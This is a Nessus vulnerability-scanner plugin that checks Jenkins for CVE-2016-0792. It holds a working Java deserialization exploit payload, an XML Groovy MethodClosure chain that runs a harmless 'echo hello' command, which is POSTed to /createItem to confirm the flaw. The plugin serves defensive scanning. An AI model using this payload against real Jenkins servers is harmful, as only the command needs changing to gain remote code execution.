#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(89034);
  script_version("1.11");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2016-0792");
  script_bugtraq_id(83720);
  script_xref(name:"CERT", value:"576313");

  script_name(english:"Jenkins < 1.642.2 / 1.650 Java Object Deserialization RCE");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a remote code execution
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Jenkins web server running on the remote host is affected by a
remote code execution vulnerability due to unsafe deserialize calls of
unauthenticated Java objects to the Groovy library, specifically the
runtime.MethodClosure class. An unauthenticated, remote attacker can
exploit this, via a crafted XML file, to execute arbitrary code on the
target host.

Note that the Jenkins web server may be affected by other
vulnerabilities as well; however, Nessus has not tested for these.");
  # https://wiki.jenkins.io/display/SECURITY/Jenkins+Security+Advisory+2016-02-24
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?bb7b4350");
  # https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-2-xstream
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6e7fc0b6");
  # https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?9c6d83db");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Jenkins version 1.642.2 / 1.650 or later. Alternatively,
disable the CLI port per the vendor advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2016-0792");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Jenkins XStream Groovy classpath Deserialization Vulnerability');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"in_the_news", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/01/28");
  script_set_attribute(attribute:"patch_publication_date", value:"2016/02/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/02/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:cloudbees:jenkins");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"General");

  script_copyright(english:"This script is Copyright (C) 2016-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("jenkins_detect.nasl");
  script_require_keys("www/Jenkins");
  script_require_ports("Services/www", 8080);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

appname = "Jenkins";
port = get_http_port(default:8080);
get_kb_item_or_exit("www/Jenkins/"+port+"/Installed");

payload =
'<map>' +
  '<entry>' +
    '<groovy.util.Expando>' +
      '<expandoProperties>' +
        '<entry>' +
          '<string>hashCode</string>' +
          '<org.codehaus.groovy.runtime.MethodClosure>' +
            '<delegate class="groovy.util.Expando" reference="../../../.."/>' +
            '<owner class="java.lang.ProcessBuilder">' +
              '<command>' +
                '<string>echo</string>' +
                '<string>hello</string>' +
              '</command>' +
              '<redirectErrorStream>false</redirectErrorStream>' +
            '</owner>' +
            '<resolveStrategy>0</resolveStrategy>' +
            '<directive>0</directive>' +
            '<parameterTypes/>' +
            '<maximumNumberOfParameters>0</maximumNumberOfParameters>' +
            '<method>start</method>' +
          '</org.codehaus.groovy.runtime.MethodClosure>' +
        '</entry>' +
      '</expandoProperties>' +
    '</groovy.util.Expando>' +
    '<int>1</int>' +
 ' </entry>' +
'</map>';

response = http_send_recv3(
  method:"POST",
  item:'/createItem?name=find_this_dir',
  content_type:"text/xml",
  port:port,
  data:payload);

# Examine the exception. If we were successful then jenkins will fail to read a file.
if (isnull(response) || isnull(response[2])) audit(AUDIT_RESP_BAD, port);

# different slashes for windows vs. linux
if ('jobs/find_this_dir/config.xml' >!< response[2] &&
    'jobs\\find_this_dir\\config.xml' >!< response[2]) audit(AUDIT_INST_VER_NOT_VULN, appname);

report =
  '\nNessus was able to exploit a Java deserialization vulnerability' +
  '\nby sending a crafted XML payload.' +
  '\n';
security_report_v4(port:port, severity:SECURITY_HOLE, extra:report);

